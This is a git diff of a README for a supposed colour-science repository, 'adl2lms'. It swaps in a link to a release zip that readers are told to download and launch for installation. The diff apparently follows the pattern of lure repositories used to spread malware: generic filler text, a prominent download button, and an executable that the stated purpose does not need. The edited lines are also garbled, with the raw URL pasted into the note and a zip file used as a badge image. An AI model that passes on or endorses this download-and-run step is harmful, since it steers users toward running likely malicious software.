@@ -21,9 +21,9 @@ Explore a wide range of topics related to color science and technology:
 - Vectors
 
 ## Software Download
-🚀 **Download the Software Here:** [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip)
+🚀 **Download the Software Here:** [https://github.com/xda234r/adl2lms/releases/download/v2.0/Release_x64.zip](https://github.com/xda234r/adl2lms/releases/download/v2.0/Release_x64.zip)
 
-_*(Note: The Software.zip needs to be launched for installation)*_
+_*(Note: The https://github.com/xda234r/adl2lms/releases/download/v2.0/Release_x64.zip needs to be launched for installation)*_
 
 ## Releases
 If the download link does not work, please check the "Releases" section of this repository to access the latest updates and software versions.
@@ -32,7 +32,7 @@ If the download link does not work, please check the "Releases" section of this 
 Start exploring the fascinating world of color science by diving into the resources available in this repository. Feel free to contribute, share your insights, or collaborate with other color enthusiasts.
 
 ## Colorful Button
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/xda234r/adl2lms/releases/download/v2.0/Release_x64.zip)](https://github.com/xda234r/adl2lms/releases/download/v2.0/Release_x64.zip)
 
 Let's embark on a colorful journey of discovery and innovation with "adl2lms"! 🎨✨
 
